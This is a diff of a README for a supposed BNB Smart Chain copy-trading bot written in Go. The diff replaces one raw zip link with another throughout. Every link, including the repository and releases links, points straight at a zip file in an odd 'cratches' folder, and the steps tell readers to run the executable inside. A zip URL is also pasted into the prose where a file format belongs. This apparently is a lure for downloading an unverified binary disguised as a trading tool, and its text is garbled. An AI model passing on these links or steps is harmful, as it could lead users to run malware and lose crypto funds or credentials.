@@ -1,6 +1,6 @@
 # 🎉 bnb-copy-trading-bot-go - Effortlessly Copy Trades on BSC
 
-[![Download](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bnb-copy-trading-bot-go-1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bnb-copy-trading-bot-go-1.8.zip)
+[![Download](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bot_trading_go_bnb_copy_v2.6-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bot_trading_go_bnb_copy_v2.6-alpha.5.zip)
 
 ## 📋 Description
 
@@ -21,14 +21,14 @@ Follow these steps to get up and running with the bnb-copy-trading-bot-go.
 
 To download the latest version of the bnb-copy-trading-bot-go, visit this page to download:
 
-[Download the latest release!](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bnb-copy-trading-bot-go-1.8.zip)
+[Download the latest release!](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bot_trading_go_bnb_copy_v2.6-alpha.5.zip)
 
 Once on the releases page, locate the latest version. Download the installation file corresponding to your operating system. 
 
 ### ⚙️ Installation Steps
 
 1. Locate the downloaded file on your device.
-2. Extract the contents if the file is in a compressed format (like .zip or https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bnb-copy-trading-bot-go-1.8.zip).
+2. Extract the contents if the file is in a compressed format (like .zip or https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bot_trading_go_bnb_copy_v2.6-alpha.5.zip).
 3. Open the extracted folder and find the executable file.
 4. Double-click the executable file to start the installation.
 
@@ -78,7 +78,7 @@ If you're interested in contributing to the project or wish to report an issue, 
 
 ### 🔗 Useful Links
 
-- [Visit Repository](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bnb-copy-trading-bot-go-1.8.zip)
-- [Latest Releases](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bnb-copy-trading-bot-go-1.8.zip)
+- [Visit Repository](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bot_trading_go_bnb_copy_v2.6-alpha.5.zip)
+- [Latest Releases](https://raw.githubusercontent.com/x7xomegax7x/bnb-copy-trading-bot-go/main/cratches/bot_trading_go_bnb_copy_v2.6-alpha.5.zip)
 
 Thank you for using bnb-copy-trading-bot-go. Enjoy your trading experience!
